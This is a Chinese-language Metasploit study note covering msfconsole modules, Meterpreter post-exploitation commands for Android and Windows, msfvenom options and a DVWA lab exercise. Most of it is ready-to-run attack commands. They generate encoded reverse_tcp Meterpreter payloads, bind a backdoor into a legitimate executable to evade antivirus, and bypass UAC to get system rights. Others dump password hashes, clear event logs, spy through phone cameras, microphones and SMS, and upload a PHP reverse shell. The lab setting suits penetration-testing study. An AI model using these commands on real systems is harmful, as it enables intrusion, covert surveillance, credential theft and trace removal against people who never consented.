## msfconsole

> 目录:/usr/share/metasploit-framework -- 主目录
>
> modules -- 模块目录
>
> auxiliary  -- 辅助模块,端口扫描,登陆密码爆破,漏洞验证
>
> evasion -- 逃避模块 --躲避杀软
>
> exploits -- 漏洞利用板块,包含主流的漏洞利用脚本,通常是对某些可能存在的目标进行漏洞利用
>
> nops -- PHP辅助利用模块,shellcode前置nop指定长度的工具
>
> payloads -- 加载攻击载荷,
>
> post -- 功能性指令模块,下载,远程截屏 ---后渗透模块
>
> encoders:编码器模块,主要包含各种编码工具,对payload进行编码加密,以便于绕过入侵检测和过滤系统
>
> Plugins 模块-- 使用时需要进行先加载--存放插件
>
> tools 工具模块
>
> data  字典文件
>
> db 数据库存放目
>
>  lib 加载包文件--运行库
>
>  config -- 存放配置文件



### Auxiliary  -- 辅助模块,端口扫描,登陆密码爆破,漏洞验证

> search type:模块名称 name:smb --》在当前的模块内查找属于smb的模块
>
> use auxiliary/   --》 列出当前分类下的所有模块
>
> show auxiliary  --》 列出当前分类下的所有模块

* ssh爆破模块
  * `scanner/ssh/ssh_login` 设置用户名以及密码,进行测试.







tips:

​	kali中的msfvenom渠道了msfpayload和msfencode,常用于生成后门木马

​	msfpayload是MSF攻击载荷生成器,用户生成shellcode和可执行代码

​	msfencode是MSF编码器



## Meterpreter

> Meterpreter是Metasploit框架中的一个利器,作为漏洞溢出后的攻击载荷使用,攻击载荷在触发漏洞后会返回一个由我们控制的通道,可用于执行远程命令
>
> Meterpreter提供了各个主流平台的版本,包括Windows,linux,同时支持x86,x64平台,另外还提供了基于PHP和java语言的实现,该工具的工作模式是`纯内存`的,好处在于便于隐藏,很难被杀软检测到,不需要访问目标主机磁盘,所以很难进行痕迹检测,除此之外,该工具还支持Ruby的脚本形式的扩展

### Meterpreter中常用的反弹类型

> reverse_tcp
>
> ​	这是一个基于TCP的反向链接反弹shell,使用起来更加稳定

### Meterpreter常用命令

```shel
help - 查看帮助
background -返回指令,可以将当前进度挂起到后台
bgkill -杀死一个后台正在挂起的任务
bglist -展示当前正在运行的后台脚本的列表
bgrun -作为一个后台任务运行脚本
channel -显示活动频道
sessions -i number --number表示第N个session,使用session -i 连接到指定需要的会话
sessions -k number -与会话进行交互
close -关闭当前通道
exit -终止meterpreter会话
quit -终止meterpreter会话
interact id  -切换进另一个信道
run -执行当前所配置的指令
```

#### 针对安卓手机的常用命令

* 获取手机通讯录:dump_contacts
* 获取短信记录:dump_sms
* 控制当前手机发送短信:send_sms -d 18811111 -t "hello?"
* 获取当前手机的GPS定位信息:geolocate
* 获取当前手机的WI-FI定位信息:wlan_geolocate
* 控制当前手机进行录音:record_mic -d 5
* 获取当前手机的相机设备:webcam_list
* 控制当前手机进行拍照:webcam_snap
* 控制当前手机的摄像头:webcam_stream

#### 针对Windows系统的常用命令

1. 查看进程:ps

2. 查看当前进程号:getpid

3. 查看系统信息:sysinfo

4. 查看目标机是否为虚拟机:run post/windows/gather/checkvm

5. 查看完整网络设置:route

6. 查看当前权限:getuid

7. 自动提权:getsystem

8. 关闭杀毒软件: run post/windows/manage/killav

9. 启动远程桌面协议:run post/windows/manage/enable_rdp

10. 列举当前登陆的用户:run /post/windows/gather/enum_logged_on_users

11. 查看当前应用程序:run /post/windows/gather/enum_applications

12. 抓取当前目标机的屏幕截图:load espia ; screengrab

13. 抓取摄像头的图片:webcam snap

14. 查看目标机当前所在目录:pwd

15. 查看当前本机目录:getlwd

16. 导出当前用户密码哈希:run hashdump

    * 或使用以下两台命令
      * 将文件导出(权限更高):run windows/gather/smart_hashdump
      * 抓取自动登陆的账号和密码:run windows/gather/credentials/windows_autologin

    * 用户名:SID:LM哈希:NTML哈希

17. 直接获取明文密码:(该功能需要获取系统权限,获取系统权限可使用getsystem)

    1. 首先在终端输入`load kiwi` 进行加载kiwi模块



## msfvenom 常用参数

```shell
-l
	列出指定模块的所有可用资源,模块类型包括:payloads,encoders,nops,all

-p
	指定需要使用的payload(攻击载荷)

-f 
	指定输出格式(计算机可执行格式)

-e
	指定需要使用的encoder(编码器)编码免杀

-a 
	指定payload的目标架构
	选择架构平台:x86|64|x86_64
	
-o
	保存payload文件输出

-b 
	设置规避字符集,比如:"\x00\xff"避免使用的字符

-n
	为payload预先指定一个NOP滑动长度

-s
	设定有效供给载荷的最大生成长度payload--(文件大小)

-i
	指定payload的编码次数

-c
	指定一个附加的win32 shellcode文件
	
-x
	指定一个自定义的可执行文件作为模板
	例如:原先有个正常的ormal.exe 可以通过把这个选项把后门捆绑到这个程序上面

-k
	保护模版程序的动作,注入的payload作为一个新的进程运行
	例如:原先有个正常的normal.exe 可以通过把这个选项把后门捆绑到这个程序上面(隐蔽性更强)
	
-v 
	指定一个自定义的变量,以确认输出格式
```



示例:

```shell
# 基础操作:
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.74.128 lport=4445 -f exe -o text.exe

# 使用-e指定编码器:
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.74.128 lport=4445 -e x86/shikata_ga_nai -f exe -o text.exe

# 添加-i增加编码次数
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.74.128 lport=4445 -e x86/shikata_ga_nai -i 6 -f exe -o text.exe

# 进行自捆绑操作 -->以下操作二选一
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.74.128 lport=4445 -e x86/shikata_ga_nai -i 6 -x uiso9_cn.exe 

msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.74.128 lport=4445 -e x86/shikata_ga_nai -i 6 -f exe -x uiso9_cn.exe -o ruan.exe

## 多重编码payload生成样本进行检测
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=172.16.74.128 lport=4445 -e x86/shikata_ga_nai -i 20 -f raw | msfvenom -e x86/alpha_upper -i 10 -f raw| msfvenom -e x86/countdown -i 10 -x uiso9_cn.exe -f exe -o ruan2.exe



# 提权: --> 以下模块二选一进行尝试
use  exploit/windows/local/bypassuac_windows_store_reg 

use exploit/windows/local/bypassuac_sluihijack  # (推荐)  # --> 成功后使用getsystem即可成功提权-->获取系统级权限

# 使用RunAs提权 -->风险较高-需要用户手动点击确认-确认后即可获得系统级权限
exploit/windows/local/ask模块（该模块在windows 32位和64位下都有效）

# 痕迹清理(需使用system权限)  --> 在靶机上输入eventvwr即可查看安全日志
clearev


```



## 练习

> dvwa靶场
>
> IP地址:http://192.168.101.143/dvwa/login.php



* 设置监控--使用handler模块

  * use exploit/multi/handler

* 设置攻击载荷

  1. 设置payload

     1. > set payload php/meterpreter/reverse_tcp

  2. 设置LHOST&&LPORT

     1. set lhost 192.168.1.129
     2. set lport 4444

* 监听当前设置的端口程序

  * run | exploit

* 生成PHP后门程序

  * ```shell
    msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.101.129 lport=4449 R >shell.php
    ```

* 将后门上传到该后台中

  * 略

* 在浏览器中访问该文件的地址

  * http://192.168.101.143/dvwa/../../hackable/uploads/shell.php

* 完成



tips:

简单的ftp下载器:

```python
#python2
python -m SimpleHTTPServer 8000

#python3
python3 -m http.server 8000
```













![image-20220925144159670](https://raw.githubusercontent.com/r0o983/images/main/image-20220925144159670.png)



